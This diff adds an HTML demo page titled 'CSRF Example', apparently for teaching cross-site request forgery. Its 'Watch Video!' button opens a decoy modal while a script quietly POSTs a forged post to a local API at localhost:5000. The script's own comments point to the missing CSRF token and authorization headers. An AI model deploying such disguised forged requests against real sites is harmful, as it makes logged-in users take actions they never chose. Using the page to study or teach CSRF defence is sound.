@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CSRF Example</title>
+    <style>
+        body {
+            font-family: Arial, Helvetica, sans-serif;
+        }
+        body * {
+            box-sizing: border-box;
+        }
+        .hidden.modal-bg {
+            display: none;
+        }
+        .modal-bg {
+            top: 0px;
+            position: fixed;
+            width: 100vw;
+            height: 100vh;
+            background-color: rgba(50, 50, 50, 0.8);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .modal {
+            background-color: white;
+            width: 70vw;
+            height: 70vh;
+            border-radius: 6px;
+        }
+        .close {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+        }
+    </style>
+    <script>
+        const createUnauthorizedPost = () => {
+            // fake modal to throw you off the scent...
+            document.querySelector('.modal-bg').classList.remove('hidden');
+            
+            // illegal form submission...
+            const url = 'http://127.0.0.1:5000/api/posts';
+            const postData = {
+                "image_url": "https://upload.wikimedia.org/wikipedia/en/thumb/3/3b/SpongeBob_SquarePants_character.svg/1024px-SpongeBob_SquarePants_character.svg.png",
+                "caption": "It was the best of times, it was the worst of times, it was the age of wisdom, it was the age of foolishness, it was the epoch of belief, it was the epoch of incredulity, it was the season of Light, it was the season of Darkness, it was the spring of hope, it was the winter of despair, we had everything before us, we had nothing before us, we were all going direct to Heaven, we were all going direct the other way—in short, the period was so far like the present period, that some of its noisiest authorities insisted on its being received, for good or for evil, in the superlative degree of comparison only. There were a king with a large jaw and a queen with a plain face, on the throne of England; there were a king with a large jaw and a queen with a fair face, on the throne of France. In both countries it was clearer than crystal to the lords of the State preserves of loaves and fishes, that things in general were settled for ever. It was the year of Our Lord one thousand seven hundred and seventy-five. Spiritual revelations were conceded to England at that favoured period, as at this. Mrs. Southcott had recently attained her five-and-twentieth blessed birthday, of whom a prophetic private in the Life Guards had heralded the sublime appearance by announcing that arrangements were made for the swallowing up of London and Westminster. Even the Cock-lane ghost had been laid only a round dozen of years, after rapping out its messages, as the spirits of this very year last past (supernaturally deficient in originality) rapped out theirs. Mere messages in the earthly order of events had lately come to the English Crown and People, from a congress of British subjects in America: which, strange to relate, have proved more important to the human race than any communications yet received through any of the chickens of the Cock-lane brood.",
+                "alt_text": "More malicious content :("
+            };
+
+            fetch("http://localhost:5000/api/posts/", {
+                    method: "POST",
+                    headers: {
+                        'Content-Type': 'application/json',
+                        // 'X-CSRF-TOKEN': '????',  // or 
+                        // 'Authorization': 'Bearer ??????'
+                    },
+                    body: JSON.stringify(postData)
+                })
+                .then(response => response.json())
+                .then(data => {
+                    console.log(data);
+                });
+        };
+
+        const hideModal = ev => {
+            document.querySelector('.modal-bg').classList.add('hidden');
+        }
+    </script>
+</head>
+<body>
+
+    <h1>Demo 1</h1>
+    <button onclick="createUnauthorizedPost()">Watch Video!</button>
+    <div class="modal-bg hidden">
+        <button class="close" onclick="hideModal(event);">Close</button>
+        <div class="modal">
+            text text
+        </div>
+    </div>
+</body>
+</html>
